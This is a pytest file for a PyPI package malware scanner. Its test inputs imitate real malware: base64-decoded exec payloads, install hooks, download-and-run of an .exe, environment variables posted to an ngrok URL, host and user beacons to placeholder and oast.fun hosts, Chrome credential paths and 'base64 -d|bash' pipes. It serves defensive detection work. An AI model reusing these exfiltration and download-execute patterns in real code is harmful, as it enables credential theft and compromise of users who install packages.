import textwrap

import pytest

from pkg_sentry.pyscan import local_imports, scan_python


def scan(code, role="runtime", path="pkg/mod.py"):
    return scan_python(path, textwrap.dedent(code), role)


def rules(code, role="runtime"):
    return sorted({f.rule for f in scan(code, role)})


# Shapes taken from real PyPI malware.

def test_exec_of_base64_in_setup_is_critical():
    found = scan('''
        import base64
        code = b"aW1wb3J0IG9z"
        exec(base64.b64decode(code))
    ''', role="setup", path="setup.py")
    hit = [f for f in found if f.rule == "exec-decoded"][0]
    assert hit.critical
    assert hit.where == "setup.py:4"
    assert "b64decode" in hit.snippet


@pytest.mark.parametrize(
    "code",
    [
        "import base64 as b\nexec(b.b64decode('eA=='))",
        "from base64 import b64decode as d\nexec(d('eA=='))",
        "exec(__import__('base64').b64decode('eA=='))",
        "import zlib, base64\nexec(zlib.decompress(base64.b64decode('eA==')))",
        "import marshal\nexec(marshal.loads(b'...'))",
        "exec(''.join(chr(c) for c in [112, 114]))",
        "exec(bytes([112, 114]).decode())",
        "from cryptography.fernet import Fernet\nexec(Fernet(k).decrypt(b'gAAA'))",
        "import base64\npayload = base64.b64decode(blob)\nexec(payload)",
        "import codecs\neval(compile(codecs.decode('cevag', 'rot13'), 'x', 'exec'))",
        "getattr(__import__('builtins'), 'exec')(__import__('base64').b64decode('eA=='))",
    ],
)
def test_hidden_code_is_found_however_it_is_written(code):
    assert "exec-decoded" in rules(code)


def test_custom_install_command():
    found = rules('''
        from setuptools import setup
        from setuptools.command.install import install

        class CrazyInstallStrat(install):
            def run(self):
                install.run(self)
                from main import main
                main()

        setup(name="bytesp", cmdclass={"install": CrazyInstallStrat})
    ''', role="setup")
    assert found == ["install-hook"]


def test_shell_and_network_during_install():
    found = rules('''
        import subprocess, requests
        from setuptools import setup
        subprocess.Popen("whoami", shell=True)
        requests.post("https://x.example/c", data={"a": 1})
        setup(name="x")
    ''', role="setup")
    assert found == ["network-at-install", "shell-at-install"]


def test_import_time_means_module_level_only():
    code = '''
        import subprocess
        subprocess.run(["id"])

        def helper():
            subprocess.run(["ls"])
    '''
    found = scan(code, role="import")
    assert [(f.rule, f.line) for f in found if "shell" in f.rule] == [
        ("shell-at-install", 3), ("shell", 6)]


def test_download_and_run_a_program():
    found = scan('''
        import requests, subprocess, os
        r = requests.get("https://cdn.discordapp.com/attachments/1/2/Windows.exe")
        open("upd.exe", "wb").write(r.content)
        subprocess.call(["upd.exe"])
    ''', role="setup")
    assert any(f.rule == "download-exec" and f.critical for f in found)


def test_downloading_and_running_later_counts_for_less():
    found = scan('''
        import requests, subprocess
        def update():
            r = requests.get("https://example.com/tool.exe")
            subprocess.call(["tool.exe"])
    ''', role="import")
    hit = [f for f in found if f.rule == "download-exec"][0]
    assert hit.value == 25 and not hit.critical


def test_exec_of_downloaded_code():
    assert "download-exec" in rules(
        "import urllib.request\nexec(urllib.request.urlopen('https://x/p').read())")


def test_environment_sent_to_ngrok():
    found = rules('''
        import os, urllib.request, urllib.parse
        def run_payload():
            data = dict(os.environ)
            encoded = urllib.parse.urlencode(data).encode()
            req = urllib.request.Request("https://5cecdbdb0328.ngrok.app/c", encoded)
            urllib.request.urlopen(req)
    ''')
    assert found == ["env-dump", "exfil-endpoint"]


def test_machine_details_sent_out():
    found = rules('''
        import socket, getpass, requests
        info = {"h": socket.gethostname(), "u": getpass.getuser()}
        requests.get("https://x.example/", params=info)
    ''')
    assert "recon" in found


def test_steals_browser_passwords():
    found = rules('''
        import os
        base = os.getenv("LOCALAPPDATA")
        path = os.path.join(base, "Google", "Chrome", "User Data", "Local State")
    ''')
    assert found == ["secrets"]


def test_obfuscator_markers():
    armor = "from pyarmor_runtime_000000 import __pyarmor__\n__pyarmor__(__name__, __file__, b'x')"
    assert "obfuscated" in rules(armor)
    names = ["IlIlIlIl", "lIlIlIlI", "IIlIIlII", "llIIllII", "IlllIlll", "OO0O0OO0"]
    assert "obfuscated" in rules("\n".join(f"{n} = 1" for n in names))
    assert "obfuscated" in rules("import os\n" + "\n".join(f"{n} = os" for n in names))


def test_lines_of_underscores_are_not_obfuscation():
    line = "_" * 40
    assert rules(f"# {line}\nx = 1\n\"\"\"\n{line}\n\"\"\"\nimport os") == []


def test_big_encoded_blob():
    found = scan("data = '" + "QUJD" * 600 + "'")
    assert [(f.rule, f.value) for f in found] == [("obfuscated", 10)]


def test_unparsable_files_still_get_text_checks():
    found = rules('print "hi"\nexec base64.b64decode(x)\nurl = "https://webhook.site/x"')
    assert found == ["exfil-endpoint"]
    found = rules('print "x"\nexec(base64.b64decode(blob))')
    assert found == ["exec-decoded"]


def test_absurdly_deep_code_does_not_crash_the_scan():
    deep = "x = " + " + ".join(["1"] * 50_000) + "\nurl = 'https://webhook.site/abc'"
    assert "exfil-endpoint" in rules(deep)
    nested = "x = " + "[" * 5000 + "]" * 5000
    assert rules(nested) == []


def test_main_guard_doesnt_run_on_import():
    found = scan('''
        import subprocess
        if __name__ == "__main__":
            subprocess.run(["make"])
    ''', role="import")
    assert [f.rule for f in found] == ["shell"]


def test_main_guard_with_extra_conditions():
    found = scan('''
        import sys, pty
        if sys.platform != "win32" and __name__ == "__main__":
            pty.spawn(sys.argv[1:])
    ''', role="import")
    assert [f.rule for f in found] == ["shell"]


def test_commands_built_from_variables_count_for_less():
    found = scan('''
        import subprocess
        subprocess.check_call(" ".join(compiler) + " -march=native -E -")
        subprocess.check_call("whoami")
    ''', role="setup")
    points = sorted(f.value for f in found if f.rule == "shell-at-install")
    assert points == [15, 30]


@pytest.mark.parametrize(
    "call",
    ['subprocess.run(["/bin/sh", "autogen.sh"])', 'subprocess.check_call(["./build_bundled.sh"])',
     'os.system("twine upload dist/*")', 'subprocess.check_output(["brew", "--prefix"])',
     'os.system("rm -rf dist")'],
)
def test_more_build_commands(call):
    assert rules(f"import os, subprocess\n{call}", role="setup") == ["shell"]


def test_shell_dash_c_is_not_a_build_script():
    assert "shell-at-install" in rules('import subprocess\nsubprocess.run(["sh", "-c", "id"])',
                                       role="setup")


def test_detecting_pyarmor_is_not_using_it():
    assert rules("def is_obfuscated(m):\n    return 'pyarmor_runtime' in m.__name__") == []


def test_build_tools_in_setup_are_only_a_weak_sign():
    found = rules('''
        import subprocess, sys
        sha = subprocess.check_output(["git", "rev-parse", "HEAD"])
        subprocess.check_call([sys.executable, "-m", "pip", "--version"])
        subprocess.run("cmake --build .", shell=True)
    ''', role="setup")
    assert found == ["shell"]


def test_environment_handed_to_a_subprocess_is_fine():
    found = rules('''
        import os, subprocess, requests
        env = os.environ.copy()
        env["X"] = "1"
        subprocess.run(["tool"], env=env)
        requests.get("https://api.example.com")
    ''')
    assert "env-dump" not in found


def test_environment_posted_directly():
    found = rules("import os, requests\nrequests.post('https://x.example', json=os.environ)")
    assert "env-dump" in found


# Normal code that must stay quiet.

@pytest.mark.parametrize(
    "code",
    [
        # reading the version this way is common in setup.py
        'exec(open("mypkg/version.py").read())',
        'with open("mypkg/__about__.py") as f:\n    exec(f.read(), about)',
        'from pathlib import Path\nexec(Path("pkg/release.py").read_text())',
        'from setuptools import setup\nfrom setuptools.command.sdist import sdist\n'
        'class S(sdist):\n    pass\nsetup(name="x", cmdclass={"sdist": S})',
        # building C extensions
        'from setuptools import setup\nfrom setuptools.command.build_ext import build_ext\n'
        'class B(build_ext):\n    pass\nsetup(name="x", cmdclass={"build_ext": B})',
        'from setuptools import setup\nsetup(name="x", version="1.0", packages=["x"])',
    ],
)
def test_normal_setup_files(code):
    assert rules(code, role="setup") == []


@pytest.mark.parametrize(
    "code",
    [
        "import subprocess, os\nsubprocess.run(['git', 'status'], env=os.environ.copy())",
        "import os\nhome = os.environ.get('HOME')\ntoken = os.environ['TOKEN']",
        "import base64\ndata = base64.b64decode(s)",
        "import requests\ndef fetch(u):\n    return requests.get(u).json()",
        "result = eval(expression, {'__builtins__': {}})",
        "template = compile(source, filename, 'exec')",
        "import socket\nhost = socket.gethostname()",
    ],
)
def test_normal_library_code(code):
    found = rules(code)
    assert found in ([], ["shell"]), found


def test_local_imports():
    assert local_imports("from main import main\nimport os\nimport a.b as c\nfrom . import x") \
        == {"main", "os", "a"}
    assert local_imports("print 'py2'") == set()


# Tricks found in the older half of the malware samples.

def test_decoded_shell_command():
    found = scan("import os\nfrom base64 import b64decode as b64d\nos.system(b64d('Y3VybA=='))",
                 role="setup")
    hit = [f for f in found if f.rule == "exec-decoded"][0]
    assert hit.critical and hit.message == "decodes a hidden command and runs it"


def test_python_dash_c_with_decoded_code():
    found = rules("import subprocess, base64, sys\n"
                  "subprocess.Popen([sys.executable, '-c', base64.b64decode(cmd).decode()])")
    assert "exec-decoded" in found


def test_aliased_dangerous_functions_are_followed():
    found = rules('''
        import os
        _ssystem = os.system
        _ssystem("start pythonw.exe evil.py")
    ''', role="setup")
    assert "shell-at-install" in found


def test_functions_called_at_the_top_level_run_on_import():
    found = scan('''
        import requests
        def beacon():
            requests.post("https://x.example/c", data={"x": 1})
        def unused():
            requests.get("https://x.example/other")
        beacon()
    ''', role="import")
    hits = [f.line for f in found if f.rule == "network-at-install"]
    assert hits == [4]


def test_machine_details_sent_to_a_server():
    found = scan('''
        import requests, socket, getpass
        info = {"host": socket.gethostname(), "user": getpass.getuser()}
        def go():
            requests.post("https://x.example/collect", json=info)
    ''')
    recon = [f for f in found if f.rule == "recon"]
    assert recon and max(f.value for f in recon) == 25


def test_self_uninstall_during_install():
    found = rules("import os\nos.system('pip3 --verbose uninstall ' + NAME + ' -y')", role="setup")
    assert "hides-traces" in found
    assert "hides-traces" not in rules("print('run pip uninstall x to remove it')")


def test_base64_piped_into_a_shell():
    found = scan("import os\nos.system('echo %s|base64 -d|bash' % encoded)", role="setup")
    assert any(f.rule == "exec-decoded" and f.critical for f in found)


def test_powershell_download_built_on_another_line():
    found = rules('''
        import subprocess
        download_command = "Invoke-WebRequest -Uri https://x.example/a.exe -OutFile a.exe"
        subprocess.run(["powershell", "-Command", download_command])
    ''', role="setup")
    assert "hidden-powershell" in found


def test_looking_up_your_own_ip_is_not_a_beacon():
    found = rules("import socket\nip = socket.gethostbyname(socket.gethostname())")
    assert "recon" not in found


def test_hostname_inside_a_dns_query_is_a_beacon():
    found = scan("import socket, getpass\n"
                 "socket.gethostbyname(f'{getpass.getuser()}.{socket.gethostname()}.x.oast.fun')")
    assert any(f.rule == "recon" and f.value == 25 for f in found)
